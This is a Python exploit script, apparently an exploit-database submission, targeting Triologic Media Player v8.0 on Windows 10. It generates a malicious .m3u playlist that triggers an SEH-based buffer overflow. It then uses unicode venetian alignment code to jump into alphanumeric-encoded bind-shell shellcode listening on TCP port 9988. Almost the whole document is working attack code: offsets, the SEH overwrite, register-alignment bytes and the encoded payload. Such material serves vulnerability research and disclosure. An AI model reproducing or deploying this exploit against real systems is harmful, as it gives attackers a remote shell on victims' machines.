"""
Full title:         Triologic Media Player v.8
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:    http://www.triologic.net/
Version:            v.8.0.0.0
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           local exploit
Platform:           windows
"""
#!/usr/bin/python
filename="triologic_exploit.m3u"

buffer_size = 5000
n_seh_offset = 536

# windows/shell_bind_tcp LPORT=9988
# /alpha2 eax --unicode --uppercase
shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1"
"AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
"BAB30APB944JBKLK8CYKPM0KPQP59ZEP18RQTTKQBNP4KQBLLTK0RLTDKC"
"BMXLOWGOZO6NQKONQ7PVLOLC13LKRNLO0GQHOLMKQY7YRL022R74KPRLP4"
"KPBOLKQJ0TKOPSHSU7PD4OZKQ8PPPTKQ8LX4KQHO0M1ICJCOLOYTK04TKM"
"1YFP1KONQ7P6L7QXOLMKQ7W08K0RUZTM33ML8OKCMO4SEYRQHTKPXO4KQI"
"CQV4KLLPK4KR8MLKQHSTKKT4KKQJ0SYOTO4NDQKQK1Q0Y1JPQKOIPB8QOQ"
"JTKMBJKTFQM38NSOBKPKPQXBWBSNRQOB4QXPLBWNFLGKO8UWHDPM1KPKPN"
"IWTPTPPBHO9SPRKKPKOJ50P20PP0P10PP10R0S89ZLOIOYPKO9EE9XGNQ9"
"K1CRHM2KPNGKTTIK61ZLP0V0WBH7RYKOGS7KOXU0SPWQX7GIYOHKOKOZ50"
"SB3R7C83DZLOKK1KO8UQGTIGWS8RURN0M1QKO8URHRC2MQTKPTIK31G0WP"
"WNQL6QZMBR9R6JBKM1VY7OTMTOLM1KQTMOTO4N096KPQ4B4PPQF0VPVOV2"
"6PNB6R6B3QF1X3IHLOO3VKOHUTIK00NR6PFKONP38LHU7MMQPKOXUGKJPG"
"EVBPV38G6F5GM5MKOXUOLLF3LKZCPKKIPBUM57KOWMCSBRO2JM0PSKO9EA")

buffer = "A"*n_seh_offset   # 41        INC ECX
                            # 004100    ADD BYTE PTR DS:[ECX],AL 
buffer += "\x41\x71"        # nSEH      0x00410071
                            # 41        INC ECX
                            # 007100    ADD BYTE PTR DS:[ECX],DH
buffer += "\xF2\x41"        # SEH       0x004100f2 : pop esi # pop ebx # ret 0x04
                            # F2:       PREFIX REPNE:
                            # 004100    ADD BYTE PTR DS:[ECX],AL 
# our buffer start at 0019E190, we have the following registers near our buffer
# EBX 0019B178      +0x3018 12312
# ESP 0019B088      +0x3108 12552
# EBP 0019B098      +0x30F8 12536
buffer += "\x55"               # push the value of EBP on to the stack
buffer += "\x71"               # Venetian Padding
buffer += "\x58"               # take the value of EBP and pop it into EAX
buffer += "\x71"               # Venetian Padding
buffer += "\x05\x44\x11"       # add eax,0x11004400  \
buffer += "\x71"               # Venetian Padding     + the net sum will add 12800 (0x322) to the value in EAX
buffer += "\x2d\x12\x11"       # sub eax,0x11001200  /
buffer += "\x71"               # Venetian Padding
buffer += "\x50"               # push the new value of EAX onto the stack (points to our buffer)
buffer += "\x71"               # Venetian Padding
buffer += "\xC3"               # redirect execution flow to the pointer at the top of the stack ==> EAX
buffer += "\x58"*117           # filler until we are alligned with shellcode
                               # execution flow will land at 0019E298
buffer += shellcode
buffer += "B"*(buffer_size-len(buffer))
print ("Wrote {} bytes".format(len(buffer)))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()